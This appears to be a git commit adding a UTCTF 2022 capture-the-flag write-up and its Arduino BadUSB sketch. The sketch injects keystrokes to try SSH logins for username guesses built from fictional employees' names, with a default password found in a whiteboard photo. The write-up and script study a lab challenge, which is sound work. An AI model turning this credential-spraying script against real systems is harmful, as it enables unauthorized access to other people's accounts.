fddec882068c3c17c33e1197cfe38bc03bcb560e
LambdaMamba <57588612+LambdaMamba@users.noreply.github.com>
2022-03-16 04:01:03 +0900

    Added writeup for UTCTF 2022 Public Panic P2

---
+++ UTCTF_2022/misc/public_panic_p2/README.md
@@ -0,0 +1,236 @@
+# UTCTF 2022 Public Panic P2(Category: Misc)
+The challenge is the following,
+
+![Figure 1](img/challenge.png) 
+
+
+We are told that we should use what we found in [Public Panic P1](https://github.com/LambdaMamba/CTFwriteups/tree/main/UTCTF_2022/misc/public_panic) for this challenge. 
+
+In [Public Panic P1](https://github.com/LambdaMamba/CTFwriteups/tree/main/UTCTF_2022/misc/public_panic), we found a picture of the flag on the whiteboard.
+
+![Figure 2](img/flag.png) 
+
+If we look closely, we can also see what seems to be a default password, which is:
+
+`defaultpw5678!` 
+
+![Figure 3](img/defaultpw.png) 
+
+
+
+Now our task is to get onto their system using,
+
+`ssh xxx@misc2.utctf.live -p 8622`
+
+Since we have the password, we will need to find an account that uses this default password.
+
+From the previous challenge, I gathered all the following employee information of Sagishi Tech:
+- Wade Coldwater (Marketing): https://twitter.com/WadeColdwater
+- Debby Uselton (Marketing): https://twitter.com/DebbyUselton
+- Claude Castillo (Marketing): https://twitter.com/ClaudeCastill18
+- Cliff Shackleford (Marketing): https://twitter.com/CliffShacklefo1
+- Sidney Jaggers (Marketing): https://twitter.com/JaggersSidney
+- Misty Booker (Marketing): https://twitter.com/MistyBooker99
+- Craig Wallace (Chief Information Security Officer): https://twitter.com/CraigWa09526548
+- Sherman Kern (CEO): https://twitter.com/kern_sherman
+- Neil Cline (Product Manager): https://twitter.com/NeilCline9
+- Britt Bryant (CTO): https://twitter.com/BrittBryant18
+- Robyn Swanson (Accountant): https://twitter.com/RobynSwanson96
+
+
+
+I looked all over their Twitter accounts, but couldn't find any tweets or pictures that could contain hints to their username. I've also tried their Twitter usernames, but that did not work. Therefore, I assumed that their account usernames have to do with their names.
+
+I went to [Active Directory User Naming conventions](https://activedirectorypro.com/active-directory-user-naming-convention/), and saw the following,
+
+![Figure 4](img/namingconvention.png) 
+
+So I assumed that the usernames conventions might be one of the following:
+
+1. Complete first name plus last name
+2. Initial of first name and complete last name
+3. First three characters of the first name and first three of last name
+4. Three random letters and three numbers
+
+I felt that 4 could be ruled out because I couldn't find much information about the random letters and numbers using OSINT for the Sagishi Tech employees.
+
+So I went ahead and constructed a list of the possible usernames for each of the Sagishi Tech members in [usernames.txt](./usernames.txt), which looks like the following:
+
+```
+wadecoldwater
+wade.coldwater
+wade_coldwater
+wcoldwater
+wadcol
+
+debbyuselton
+debby.uselton
+debby_uselton
+duselton
+debuse
+
+
+claudecastillo
+claude.castillo
+claude_castillo
+ccastillo
+clacas
+
+
+cliffshackleford
+cliff.shackleford
+cliff_shackleford
+cshackleford
+clisha
+
+
+sidneyjaggers
+sidney.jaggers
+sidney_jaggers
+sjaggers
+sidjag
+
+
+mistybooker
+misty.booker
+misty_booker
+mbooker
+misboo
+
+craigwallace
+craig.wallace
+craig_wallace
+cwallace
+crawal
+
+
+shermankern
+sherman.kern
+sherman_kern
+skern
+sheker
+
+
+neilcline
+neil.cline
+neil_cline
+ncline
+neicli
+
+
+brittbryant
+britt.bryant
+britt_bryant
+bbryant
+bribry
+
+
+robynswanson
+robyn.swanson
+robyn_swanson
+rswanson
+robswa
+```
+
+Now, we just need to `ssh xxx@misc2.utctf.live -p 8622` to test all the possible usernames. 
+I didn't want to manually ssh all of these usernames, and I wasn't too familiar with tools that automates logins attempts on the CMD. Luckily, I had a [Arduino BadUSB Keystroke Injector I made some time ago](https://dev.to/lambdamamba/a-badusb-that-is-pretty-useful-making-a-keystroke-injector-in-arduino-that-can-crack-passwords-using-brute-force-3e77) next to me, so I decided to use that.
+ 
+I wrote an Arduino program [brute_ssh.ino](./brute_ssh/brute_ssh.ino), which injects Keystrokes into the CMD after turning on the switch. There will be a 5 second delay between each password attempt, and will try the passwords
+ `defaultpw5678!`, `defaultpw5678`, and `5678!`. Also, there will be a 2 seconds delay between each username attempt. It will try all 3 passwords for each username in [usernames.txt](./usernames.txt).
+A section of [brute_ssh.ino](./brute_ssh/brute_ssh.ino) looks like the following,
+
+```
+#include "Keyboard.h"
+
+int switchPin = 9;
+int switchstate = 0;
+
+void setup() {
+  Keyboard.begin();
+  pinMode(switchPin, INPUT);
+}
+
+void loop() {
+  switchstate = digitalRead(switchPin);
+  //Start inputting into the CMD after turning the switch on
+  if (switchstate == HIGH){
+    Keyboard.println("ssh wadecoldwater@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+    Keyboard.println("ssh wade.coldwater@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+    Keyboard.println("ssh wade_coldwater@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+    Keyboard.println("ssh wcoldwater@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+    Keyboard.println("ssh wadcol@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+    ...
+```
+
+The following shows the sped up demo of the [Brute Force keystroke injector](https://github.com/LambdaMamba/KeystrokeInjection):
+
+![arduinodemo.gif](arduinodemo.gif)
+
+The [full video is on my Youtube](https://youtu.be/C51PT2RJHn4).
+
+
+I successfully logged into the server using the following credentials:
+
+- Username: `cshackleford`
+- Password: `defaultpw5678!`
+
+
+And once I logged into the server, I did `ls`, and saw that there was a file named `flag.txt`. The contents were,
+
+![Figure 10](img/shackle.png) 
+
+Therefore, the flag is:
+
+`utflag{conventions_knowledge_for_the_win}`
+
---
+++ UTCTF_2022/misc/public_panic_p2/brute_ssh/brute_ssh.ino
@@ -0,0 +1,707 @@
+#include "Keyboard.h"
+
+int switchPin = 9;
+int switchstate = 0;
+
+void setup() {
+  Keyboard.begin();
+  pinMode(switchPin, INPUT);
+}
+
+void loop() {
+  switchstate = digitalRead(switchPin);
+  //Start inputting into the CMD after turning the switch on
+  if (switchstate == HIGH){
+    Keyboard.println("ssh wadecoldwater@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+    Keyboard.println("ssh wade.coldwater@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+    Keyboard.println("ssh wade_coldwater@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+    Keyboard.println("ssh wcoldwater@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+    Keyboard.println("ssh wadcol@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+
+
+
+
+
+    Keyboard.println("ssh debbyuselton@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+    Keyboard.println("ssh debby.uselton@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+    Keyboard.println("ssh debby_uselton@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+    Keyboard.println("ssh duselton@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+    Keyboard.println("ssh debuse@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+
+
+
+
+
+
+
+    Keyboard.println("ssh claudecastillo@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+    Keyboard.println("ssh claude.castillo@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+    Keyboard.println("ssh claude_castillo@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+
+    Keyboard.println("ssh ccastillo@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+    Keyboard.println("ssh clacas@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+
+
+    Keyboard.println("ssh cliffshackleford@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+    Keyboard.println("ssh cliff.shackleford@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+    Keyboard.println("ssh cliff_shackleford@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+    Keyboard.println("ssh cshackleford@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+    Keyboard.println("ssh clisha@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+
+
+
+
+
+
+    Keyboard.println("ssh sidneyjaggers@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+    Keyboard.println("ssh sidney.jaggers@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+    Keyboard.println("ssh sidney_jaggers@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+    Keyboard.println("ssh sjaggers@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+
+    Keyboard.println("ssh sidjag@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+
+
+
+
+
+    Keyboard.println("ssh mistybooker@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+    Keyboard.println("ssh misty.booker@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+    Keyboard.println("ssh misty_booker@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+    Keyboard.println("ssh mbooker@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+    Keyboard.println("ssh misboo@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+
+
+
+
+
+    Keyboard.println("ssh craigwallace@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+    Keyboard.println("ssh craig.wallace@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+    Keyboard.println("ssh craig_wallace@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+    Keyboard.println("ssh cwallace@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+    Keyboard.println("ssh crawal@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+
+
+
+    Keyboard.println("ssh shermankern@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+    Keyboard.println("ssh sherman.kern@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+    Keyboard.println("ssh sherman_kern@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+    Keyboard.println("ssh skern@misc2.utctf.live -p 8622");
+    delay(5000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+    Keyboard.println("ssh sheker@misc2.utctf.live -p 8622");
+    delay(5000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+
+
+
+
+
+
+    Keyboard.println("ssh neilcline@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+    Keyboard.println("ssh neil.cline@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+    Keyboard.println("ssh neil_cline@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+    Keyboard.println("ssh ncline@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+    Keyboard.println("ssh neicli@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+
+
+
+
+    Keyboard.println("ssh brittbryant@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+    Keyboard.println("ssh britt.bryant@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+    Keyboard.println("ssh britt_bryant@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+    Keyboard.println("ssh bbryant@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+    Keyboard.println("ssh bribry@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+
+
+
+
+
+
+    Keyboard.println("ssh robynswanson@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+    Keyboard.println("ssh robyn.swanson@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+    Keyboard.println("ssh robyn_swanson@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+
+    Keyboard.println("ssh rswanson@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+
+
+    Keyboard.println("ssh robswa@misc2.utctf.live -p 8622");
+    delay(2000);
+    Keyboard.println("defaultpw5678!");
+    delay(5000);
+
+    Keyboard.println("defaultpw5678");
+    delay(5000);
+
+    Keyboard.println("5678!");
+    delay(5000);
+  }
+
+}
